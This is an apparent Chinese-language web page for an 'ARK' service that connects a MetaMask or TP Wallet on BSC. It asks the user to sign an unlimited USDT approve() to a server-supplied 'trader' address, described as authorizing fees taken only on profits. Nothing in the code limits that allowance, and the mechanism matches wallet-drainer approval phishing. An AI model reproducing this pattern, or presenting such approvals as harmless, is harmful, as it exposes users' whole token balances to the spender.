<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>ARK - 授权盖茨费</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0e17;color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.c{background:#161b22;border:1px solid #21262d;border-radius:20px;padding:36px 24px;width:100%;max-width:440px;text-align:center}
.c h2{color:#58a6ff;margin-bottom:8px;font-size:1.4em}
.sub{color:#8b949e;font-size:.85em;margin-bottom:24px;line-height:1.5}

/* 钱包选择 */
.wallet-select{margin-bottom:20px}
.wallet-select .label{color:#8b949e;font-size:.85em;margin-bottom:12px}
.wallet-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.wallet-card{background:#0d1117;border:2px solid #21262d;border-radius:14px;padding:18px 12px;cursor:pointer;transition:all .2s;text-align:center}
.wallet-card:active{transform:scale(.97)}
.wallet-card.active{border-color:#238636;background:#0d2818}
.wallet-card .icon{width:48px;height:48px;margin:0 auto 8px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:28px}
.wallet-card .icon-fox{background:#f6851b20}
.wallet-card .icon-tp{background:#1e9eff20}
.wallet-card .name{font-weight:700;font-size:.9em}
.wallet-card .desc{color:#8b949e;font-size:.75em;margin-top:4px}
.wallet-card .check{width:20px;height:20px;border-radius:50%;background:#238636;color:#fff;display:none;align-items:center;justify-content:center;font-size:12px;margin:6px auto 0}
.wallet-card.active .check{display:flex}

.step{background:#0d1117;border:1px solid #21262d;border-radius:12px;padding:16px;margin-bottom:12px;text-align:left}
.step .num{display:inline-block;width:24px;height:24px;background:#238636;color:#fff;border-radius:50%;text-align:center;line-height:24px;font-size:.8em;font-weight:700;margin-right:8px}
.step .num.run{background:#1f6feb;animation:pulse 1s infinite}
.step .num.err{background:#da3633}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.step .title{font-weight:600;font-size:.95em}
.step .desc{color:#8b949e;font-size:.8em;margin-top:4px}
.btn{width:100%;padding:14px;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-top:8px}
.btn:active{opacity:.8;transform:scale(.98)}
.btn-bg{background:#238636;color:#fff}
.btn-blue{background:#1f6feb;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.msg{margin-top:14px;padding:12px;border-radius:8px;font-size:.9em;display:none}
.msg.ok{display:block;background:#0d2818;color:#3fb950;border:1px solid #238636}
.msg.err{display:block;background:#2d1117;color:#f85149;border:1px solid #da3633}
.msg.info{display:block;background:#0d1117;color:#58a6ff;border:1px solid #1f6feb}
.addr{font-family:monospace;color:#d29922;font-size:.8em;word-break:break-all;margin-top:4px}
</style>
</head>
<body>
<div class="c">
  <h2>🔐 授权盖茨费</h2>
  <div class="sub">授权后系统可在盈利时自动从您的BSC钱包扣除盖茨费（服务费20% + 生态费10%）<br>无盈利不收费</div>

  <!-- 钱包选择 -->
  <div class="wallet-select" id="walletSelect">
    <div class="label">选择您要使用的钱包</div>
    <div class="wallet-grid">
      <div class="wallet-card" id="cardMetaMask" onclick="selectWallet('metamask')">
        <div class="icon icon-fox">🦊</div>
        <div class="name">MetaMask</div>
        <div class="desc">狐狸钱包浏览器插件</div>
        <div class="check">✓</div>
      </div>
      <div class="wallet-card" id="cardTP" onclick="selectWallet('tp')">
        <div class="icon icon-tp">🔵</div>
        <div class="name">TP Wallet</div>
        <div class="desc">TP钱包 App / 插件</div>
        <div class="check">✓</div>
      </div>
    </div>
  </div>

  <div id="steps" style="display:none">
    <div class="step" id="step1">
      <div><span class="num" id="n1">1</span><span class="title" id="step1Title">连接钱包</span></div>
      <div class="desc" id="step1Desc">连接您注册时使用的BSC钱包</div>
    </div>
    <div class="step" id="step2">
      <div><span class="num" id="n2">2</span><span class="title">授权 USDT</span></div>
      <div class="desc" id="step2Desc">点击下方按钮，在钱包中确认授权交易</div>
    </div>
    <div class="step" id="step3">
      <div><span class="num" id="n3">3</span><span class="title">完成</span></div>
      <div class="desc">授权成功后盖茨费系统自动激活</div>
    </div>
  </div>

  <button class="btn btn-blue" id="connectBtn" style="display:none" onclick="connectWallet()">连接钱包</button>
  <button class="btn btn-bg" id="approveBtn" style="display:none" onclick="approveUSDT()">授权 USDT</button>

  <div id="msg" class="msg"></div>

  <div id="info" style="margin-top:16px;font-size:.8em;color:#484f58;display:none">
    <div>Trader 地址: <span class="addr" id="traderAddr">--</span></div>
    <div style="margin-top:4px">USDT 合约: <span class="addr" id="usdtAddr">--</span></div>
    <div style="margin-top:4px">您的钱包: <span class="addr" id="walletAddr">--</span></div>
  </div>

  <button class="btn" style="background:#21262d;color:#8b949e;margin-top:16px" onclick="location.href='/'">返回</button>
</div>

<script>
var token = localStorage.getItem('ark_token');
var traderAddress = '';
var usdtAddress = '';
var walletAddr = '';
var connected = false;
var selectedWallet = ''; // 'metamask' | 'tp'
var provider = null;    // EIP-1193 provider

function showMsg(text, type) {
  var m = document.getElementById('msg');
  m.textContent = text;
  m.className = 'msg ' + type;
}

function setStep(num, state) {
  var el = document.getElementById('n' + num);
  el.className = 'num ' + state;
  if (state === 'done') el.textContent = '✓';
}

function selectWallet(type) {
  selectedWallet = type;

  // 更新选中样式
  document.getElementById('cardMetaMask').classList.toggle('active', type === 'metamask');
  document.getElementById('cardTP').classList.toggle('active', type === 'tp');

  // 更新按钮和步骤文字
  var connectBtn = document.getElementById('connectBtn');
  connectBtn.style.display = 'block';
  document.getElementById('steps').style.display = 'block';

  if (type === 'metamask') {
    connectBtn.textContent = '连接 MetaMask';
    document.getElementById('step1Title').textContent = '连接 MetaMask 钱包';
    document.getElementById('step2Desc').textContent = '点击下方按钮，在 MetaMask 中确认授权交易';
  } else {
    connectBtn.textContent = '连接 TP Wallet';
    document.getElementById('step1Title').textContent = '连接 TP Wallet';
    document.getElementById('step2Desc').textContent = '点击下方按钮，在 TP 钱包中确认授权交易';
  }

  // 隐藏消息
  document.getElementById('msg').className = 'msg';
}

// ═══ 获取 EIP-1193 provider ═══
// MetaMask 注入 window.ethereum
// TP Wallet 注入 window.ethereum 或 window.tp
function getProvider() {
  if (selectedWallet === 'metamask') {
    // MetaMask
    if (window.ethereum && window.ethereum.isMetaMask) {
      return window.ethereum;
    }
    // 如果 ethereum 存在但不标 isMetaMask，也接受（某些浏览器兼容）
    if (window.ethereum) {
      return window.ethereum;
    }
    return null;
  }

  if (selectedWallet === 'tp') {
    // TP Wallet — 多种注入方式
    // 1. window.ethereum (TP Wallet 浏览器内置 / TP Wallet 插件)
    if (window.ethereum && window.ethereum.isTp) {
      return window.ethereum;
    }
    // 2. window.tp (TP Wallet 旧版注入)
    if (window.tp && typeof window.tp.request === 'function') {
      return window.tp;
    }
    // 3. window.ethereum (通用 EIP-1193 — TP Wallet 移动端 DApp 浏览器)
    if (window.ethereum) {
      return window.ethereum;
    }
    return null;
  }

  return null;
}

async function loadParams() {
  if (!token) {
    showMsg('请先登录', 'err');
    return false;
  }
  try {
    var resp = await fetch('/api/vault/approve-params', {
      headers: { 'Authorization': 'Bearer ' + token }
    });
    var data = await resp.json();
    if (!data.success) {
      showMsg(data.error || '获取参数失败', 'err');
      return false;
    }
    traderAddress = data.traderAddress;
    usdtAddress = data.usdtAddress;
    walletAddr = data.bscWalletAddr;
    document.getElementById('traderAddr').textContent = traderAddress;
    document.getElementById('usdtAddr').textContent = usdtAddress;
    document.getElementById('walletAddr').textContent = walletAddr;
    document.getElementById('info').style.display = 'block';
    return true;
  } catch (e) {
    showMsg('网络错误: ' + e.message, 'err');
    return false;
  }
}

async function connectWallet() {
  if (!selectedWallet) {
    showMsg('请先选择钱包类型', 'err');
    return;
  }

  provider = getProvider();

  if (!provider) {
    var walletName = selectedWallet === 'metamask' ? 'MetaMask' : 'TP Wallet';
    if (selectedWallet === 'tp') {
      showMsg('未检测到 TP 钱包\n\n请确保：\n• 在 TP 钱包 App 中打开此页面（DApp 浏览器），或\n• 安装 TP 钱包浏览器插件\n\n也可选择 MetaMask 授权', 'err');
    } else {
      showMsg('未检测到 MetaMask，请先安装 MetaMask 浏览器插件\n\n也可选择 TP 钱包授权', 'err');
    }
    setStep(1, 'err');
    return;
  }

  try {
    // 请求账户授权
    var accounts = await provider.request({ method: 'eth_requestAccounts' });
    var addr = accounts[0];

    // 检查是否是注册的钱包地址
    if (walletAddr && addr.toLowerCase() !== walletAddr.toLowerCase()) {
      showMsg('钱包地址不匹配！\n请连接注册时使用的钱包:\n' + walletAddr.slice(0,10) + '...' + walletAddr.slice(-6), 'err');
      setStep(1, 'err');
      return;
    }

    // 检查是否在 BSC 网络
    var chainId = await provider.request({ method: 'eth_chainId' });
    if (chainId !== '0x38') {
      var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TP 钱包';
      showMsg('请在 ' + walletLabel + ' 中切换到 BSC 网络', 'info');
      try {
        await provider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        });
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          await provider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-rpc.publicnode.com'],
              blockExplorerUrls: ['https://bscscan.com']
            }]
          });
        }
      }
    }

    connected = true;
    setStep(1, 'done');
    showMsg('钱包已连接: ' + addr.slice(0,8) + '...' + addr.slice(-4), 'ok');
    document.getElementById('connectBtn').style.display = 'none';
    document.getElementById('approveBtn').style.display = 'block';

  } catch (e) {
    showMsg('连接失败: ' + (e.message || '用户拒绝'), 'err');
    setStep(1, 'err');
  }
}

async function approveUSDT() {
  if (!connected) {
    showMsg('请先连接钱包', 'err');
    return;
  }

  setStep(2, 'run');
  document.getElementById('approveBtn').disabled = true;

  try {
    var accounts = await provider.request({ method: 'eth_accounts' });
    var from = accounts[0];

    // approve(address spender, uint256 amount) = 0x095ea7b3
    // spender = traderAddress (padding to 32 bytes)
    // amount = MaxUint256
    var spenderPadded = traderAddress.toLowerCase().replace('0x', '').padStart(64, '0');
    var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    var data = '0x095ea7b3' + spenderPadded + maxAmount;

    var txParams = {
      from: from,
      to: usdtAddress,
      data: data,
    };

    // 估算 gas
    try {
      var gasEstimate = await provider.request({
        method: 'eth_estimateGas',
        params: [txParams]
      });
      txParams.gas = gasEstimate;
    } catch (ge) {
      txParams.gas = '0x' + (100000).toString(16);
    }

    var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TP 钱包';
    showMsg('请在 ' + walletLabel + ' 中确认授权交易...', 'info');

    var txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [txParams]
    });

    showMsg('交易已发送，等待确认... tx=' + txHash.slice(0,16) + '...', 'info');

    // 等待交易确认
    var receipt = null;
    for (var i = 0; i < 60; i++) {
      await new Promise(function(r) { setTimeout(r, 3000); });
      receipt = await provider.request({
        method: 'eth_getTransactionReceipt',
        params: [txHash]
      });
      if (receipt) break;
    }

    if (!receipt) {
      showMsg('交易超时，请查看 BSCScan: https://bscscan.com/tx/' + txHash, 'err');
      setStep(2, 'err');
      document.getElementById('approveBtn').disabled = false;
      return;
    }

    if (receipt.status === '0x0' || receipt.status === 0) {
      showMsg('交易失败，请查看 BSCScan: https://bscscan.com/tx/' + txHash, 'err');
      setStep(2, 'err');
      document.getElementById('approveBtn').disabled = false;
      return;
    }

    setStep(2, 'done');

    // 通知后端更新状态
    try {
      var confirmResp = await fetch('/api/vault/approve-confirmed', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + token
        },
        body: JSON.stringify({ txHash: txHash })
      });
      var confirmData = await confirmResp.json();
      if (!confirmData.success) {
        showMsg('链上验证失败: ' + (confirmData.error || '未知错误') + '\n请稍后重试或联系管理员', 'err');
        setStep(3, 'err');
        document.getElementById('approveBtn').disabled = false;
        return;
      }
    } catch (e) {
      showMsg('网络错误: ' + e.message + '，授权可能已成功，请刷新页面查看状态', 'err');
      setStep(3, 'err');
      return;
    }

    setStep(3, 'done');
    showMsg('✅ 授权成功！盖茨费系统已激活，3秒后返回...', 'ok');
    setTimeout(function() { location.href = '/'; }, 3000);

  } catch (e) {
    showMsg('授权失败: ' + (e.message || '用户拒绝'), 'err');
    setStep(2, 'err');
    document.getElementById('approveBtn').disabled = false;
  }
}

// 初始化
loadParams();
</script>
</body>
</html>
